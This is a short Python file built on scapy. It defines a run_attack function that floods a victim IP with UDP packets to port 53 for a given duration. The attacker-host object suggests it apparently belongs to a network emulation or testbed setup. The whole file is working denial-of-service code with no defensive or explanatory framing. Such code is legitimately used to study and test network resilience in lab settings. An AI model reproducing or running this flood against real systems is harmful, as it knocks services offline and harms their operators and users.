from scapy.all import Ether, IP, UDP, sendp
import time

def run_attack(attacker_host, victim_ip, duration):
    print(f"Starting UDP Flood from {attacker_host.name} to {victim_ip} for {duration} seconds.")
    start_time = time.time()
    while time.time() - start_time < duration:
        # Craft UDP packet
        packet = Ether()/IP(dst=victim_ip)/UDP(dport=53)
        attacker_host.sendp(packet)
    print(f"UDP Flood from {attacker_host.name} to {victim_ip} finished.")